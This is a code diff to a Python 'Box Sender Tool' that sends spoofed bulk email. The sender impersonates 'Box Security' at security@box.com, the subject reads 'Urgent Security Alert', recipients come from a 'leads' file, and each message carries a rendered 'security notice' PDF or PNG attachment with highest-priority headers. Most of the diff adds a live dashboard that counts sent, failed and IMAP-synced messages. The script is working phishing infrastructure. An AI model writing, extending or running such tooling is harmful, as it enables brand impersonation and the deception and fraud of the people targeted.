@@ -40,6 +40,8 @@ from rich.console import Console
 from rich.table import Table
 from rich.live import Live
 from rich import box
+from rich.panel import Panel
+from rich.layout import Layout
 from datetime import datetime
 
 console = Console()
@@ -65,27 +67,40 @@ def personalize_content(content, recipient_email, config):
 
 def get_sent_folder(imap):
     """Detects the Sent folder name in an IMAP account."""
-    res, folders = imap.list()
-    sent_folder = 'Sent'
-    for folder in folders:
-        folder_str = folder.decode()
-        if 'sent' in folder_str.lower():
-            parts = folder_str.split(' "/" ')
-            if len(parts) > 1:
-                sent_folder = parts[-1].strip('"')
-            break
-    return sent_folder
+    try:
+        res, folders = imap.list()
+        sent_folder = 'Sent'
+        for folder in folders:
+            folder_str = folder.decode()
+            if 'sent' in folder_str.lower():
+                parts = folder_str.split(' "/" ')
+                if len(parts) > 1:
+                    sent_folder = parts[-1].strip('"')
+                break
+        return sent_folder
+    except:
+        return 'Sent'
+
+def create_summary_panel(sent_count, fail_count, sync_count, total):
+    """Creates a summary panel showing overall status."""
+    summary_text = (
+        f"[bold cyan]Total Recipients:[/] {total}\n"
+        f"[bold green]Sent Successfully:[/] {sent_count}\n"
+        f"[bold red]Failed Emails:[/] {fail_count}\n"
+        f"[bold magenta]IMAP Synced:[/] {sync_count}"
+    )
+    return Panel(summary_text, title="[bold white]Summary[/bold white]", box=box.ROUNDED, border_style="blue")
 
 def create_status_table(status_data):
     """Creates a beautiful rich table for the status dashboard."""
-    table = Table(title="Box Sender Dashboard", box=box.DOUBLE_EDGE, header_style="bold blue")
+    table = Table(box=box.SIMPLE, header_style="bold blue", expand=True)
     table.add_column("Recipient", style="cyan", no_wrap=True)
     table.add_column("Status", style="bold")
     table.add_column("Sync", style="magenta")
     table.add_column("Time", justify="right")
 
-    for entry in status_data:
-        status_color = "green" if entry['status'] == "Sent" else "red"
+    for entry in status_data[-10:]:
+        status_color = "green" if entry['status'] == "Sent" else "yellow" if "..." in entry['status'] else "red"
         sync_color = "green" if entry['sync'] == "Synced" else "yellow" if entry['sync'] == "Skipped" else "red"
         table.add_row(
             entry['recipient'],
@@ -93,7 +108,24 @@ def create_status_table(status_data):
             f"[{sync_color}]{entry['sync']}[/{sync_color}]",
             entry['time']
         )
-    return table
+    return Panel(table, title="[bold white]Real-time Log[/bold white]", box=box.ROUNDED, border_style="blue")
+
+def create_dashboard_layout(status_data, sent_count, fail_count, sync_count, total):
+    """Assembles the advanced dashboard layout."""
+    layout = Layout()
+    layout.split_column(
+        Layout(name="header", size=3),
+        Layout(name="main")
+    )
+    layout["header"].update(Panel("[bold white]Box Sender - Advanced Dashboard[/bold white]", box=box.SQUARE, border_style="blue", style="on blue", subtitle="v2.4"))
+
+    main_layout = Layout()
+    main_layout.split_row(
+        Layout(create_summary_panel(sent_count, fail_count, sync_count, total), name="summary", size=30),
+        Layout(create_status_table(status_data), name="table")
+    )
+    layout["main"].update(main_layout)
+    return layout
 
 def load_leads(leads_path):
     """Loads email addresses from a leads text file."""
@@ -103,10 +135,6 @@ def load_leads(leads_path):
         with open(leads_path, 'r', encoding='utf-8') as f:
             return [line.strip() for line in f if line.strip() and '@' in line]
     except Exception as e:
-        if 'console' in globals():
-            console.print(f"[red]Error loading leads: {e}[/red]")
-        else:
-            print(f"Error loading leads: {e}")
         return []
 
 def send_spoofed_email_with_attachments(config):
@@ -117,7 +145,7 @@ def send_spoofed_email_with_attachments(config):
     sender_name = config.get('sender_name')
     sender_email = config.get('sender_email')
     recipient_emails = config.get('recipient_emails', [])
-    subject = config.get('subject')
+    total = len(recipient_emails)
 
     script_dir = os.path.dirname(os.path.abspath(__file__))
     letter_path = config.get('letter_path')
@@ -147,9 +175,13 @@ def send_spoofed_email_with_attachments(config):
     imap_pass = config.get('imap_pass')
 
     delay = config.get('delay_seconds', 0)
-    status_data = []
 
-    with Live(create_status_table(status_data), refresh_per_second=4) as live, sync_playwright() as p:
+    status_data = []
+    sent_count = 0
+    fail_count = 0
+    sync_count = 0
+
+    with Live(create_dashboard_layout(status_data, sent_count, fail_count, sync_count, total), refresh_per_second=4) as live, sync_playwright() as p:
         browser = p.chromium.launch(headless=True)
         page = browser.new_page()
 
@@ -177,16 +209,16 @@ def send_spoofed_email_with_attachments(config):
 
                 entry = {'recipient': recipient_email, 'status': 'Processing...', 'sync': 'Pending', 'time': datetime.now().strftime("%H:%M:%S")}
                 status_data.append(entry)
-                live.update(create_status_table(status_data))
+                live.update(create_dashboard_layout(status_data, sent_count, fail_count, sync_count, total))
 
                 msg = MIMEMultipart(policy=policy.default)
                 msg['From'] = f"{sender_name} <{sender_email}>"
                 msg['To'] = recipient_email
-                msg['Subject'] = personalize_content(subject, recipient_email, config)
+                msg['Subject'] = personalize_content(config.get('subject', ''), recipient_email, config)
 
                 msg['Date'] = formatdate(localtime=True)
                 msg['Message-ID'] = make_msgid(domain=sender_email.split('@')[-1])
-                msg['X-Mailer'] = "MagxxicVox/2.3 (Box Security Tool)"
+                msg['X-Mailer'] = "MagxxicVox/2.4 (Box Security Tool)"
                 msg['X-Priority'] = '1 (Highest)'
                 msg['X-MSMail-Priority'] = 'High'
                 msg['Importance'] = 'High'
@@ -199,17 +231,15 @@ def send_spoofed_email_with_attachments(config):
                     minified_attach_html = minify_html_content(personalized_attach_html)
 
                     fmt = config.get('attachment_format', 'pdf').lower()
-                    extension = 'png' if fmt in ['img', 'png'] else 'pdf' if fmt == 'pdf' else 'svg'
+                    extension = 'png' if fmt in ['img', 'png'] else 'pdf'
                     filename = f"security_notice_{i}.{extension}"
                     filepath = os.path.join(script_dir, filename)
 
                     page.set_content(minified_attach_html)
                     if extension == 'pdf':
                         page.pdf(path=filepath)
-                    elif extension == 'svg':
-                        page.screenshot(path=filepath, type='png', full_page=True)
                     else:
-                        page.screenshot(path=filepath, type='png')
+                        page.screenshot(path=filepath, type='png', full_page=True)
 
                     try:
                         with open(filepath, "rb") as attachment:
@@ -224,28 +254,31 @@ def send_spoofed_email_with_attachments(config):
 
                 try:
                     entry['status'] = 'Sending...'
-                    live.update(create_status_table(status_data))
+                    live.update(create_dashboard_layout(status_data, sent_count, fail_count, sync_count, total))
                     msg_bytes = msg.as_bytes()
-                    server.sendmail(smtp_user, recipient_email, msg_bytes) # Use auth user as envelope
+                    server.sendmail(smtp_user, recipient_email, msg_bytes)
                     entry['status'] = 'Sent'
+                    sent_count += 1
 
                     if imap and sent_folder:
                         imap.append(sent_folder, None, None, msg_bytes)
                         entry['sync'] = 'Synced'
+                        sync_count += 1
                     else:
                         entry['sync'] = 'Skipped'
                 except Exception as e:
                     entry['status'] = f'Failed: {e}'
                     entry['sync'] = 'Error'
+                    fail_count += 1
 
-                live.update(create_status_table(status_data))
+                live.update(create_dashboard_layout(status_data, sent_count, fail_count, sync_count, total))
 
             server.quit()
             if imap:
                 imap.logout()
             browser.close()
         except Exception as e:
-            console.print(f"[bold red]SMTP error: {e}[/bold red]")
+            console.print(f"[bold red]Critical Error: {e}[/bold red]")
 
 def run_setup(config_path):
     """Interactive setup to configure SMTP/IMAP settings."""
@@ -261,23 +294,20 @@ def run_setup(config_path):
     config['imap_user'] = console.input("IMAP User (often same as SMTP): ") or config['smtp_user']
     config['imap_pass'] = getpass.getpass("IMAP Password (often same as SMTP): ") or config['smtp_pass']
 
-    config['sender_name'] = console.input("Sender Display Name (e.g. Box Security): ") or "Box Security"
-    config['sender_email'] = console.input("Sender Email (e.g. security@box.com): ") or "security@box.com"
-
+    config['sender_name'] = console.input("Sender Display Name: ") or "Box Security"
+    config['sender_email'] = console.input("Sender Email: ") or "security@box.com"
     config['leads_path'] = console.input("Path to leads file (default: leads/leads.txt): ") or "leads/leads.txt"
-    config['recipient_emails'] = load_leads(config['leads_path'])
-
     config['subject'] = console.input("Email Subject (tags: [-email-]): ") or "Urgent Security Alert for [-email-]"
-    config['letter_path'] = console.input("Path to letter.html (default: letter.html): ") or "letter.html"
-    config['attachment_html_path'] = console.input("Path to attachment.html (default: attachment.html): ") or "attachment.html"
+    config['letter_path'] = console.input("Path to letter.html: ") or "letter.html"
+    config['attachment_html_path'] = console.input("Path to attachment.html: ") or "attachment.html"
 
-    config['send_attachments'] = console.input("Send attachments? (y/n, default: y): ").lower() != 'n'
+    config['send_attachments'] = console.input("Send attachments? (y/n): ").lower() != 'n'
     if config['send_attachments']:
-        config['attachment_format'] = console.input("Attachment format (pdf, img, svg - default: pdf): ").lower() or "pdf"
-        if config['attachment_format'] not in ['pdf', 'img', 'svg']:
+        config['attachment_format'] = console.input("Attachment format (pdf, png): ").lower() or "pdf"
+        if config['attachment_format'] not in ['pdf', 'png']:
             config['attachment_format'] = "pdf"
 
-    config['delay_seconds'] = int(console.input("Delay between emails in seconds (default: 5): ") or 5)
+    config['delay_seconds'] = int(console.input("Delay in seconds (default 5): ") or 5)
 
     with open(config_path, 'w', encoding='utf-8') as f:
         json.dump(config, f, indent=2)
@@ -286,7 +316,7 @@ def run_setup(config_path):
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Box Sender Tool")
-    parser.add_argument('--setup', action='store_true', help="Run the interactive setup wizard")
+    parser.add_argument('--setup', action='store_true', help="Run setup wizard")
     args = parser.parse_args()
 
     script_dir = os.path.dirname(os.path.abspath(__file__))
@@ -299,10 +329,10 @@ if __name__ == "__main__":
             config = json.load(f)
 
     if config.get('leads_path'):
-        leads_path = config['leads_path']
-        if not os.path.isabs(leads_path):
-            leads_path = os.path.join(script_dir, leads_path)
-        config['recipient_emails'] = load_leads(leads_path)
+        l_path = config['leads_path']
+        if not os.path.isabs(l_path):
+            l_path = os.path.join(script_dir, l_path)
+        config['recipient_emails'] = load_leads(l_path)
 
     for key in ['letter_path', 'attachment_html_path']:
         if config.get(key) and not os.path.isabs(config[key]):
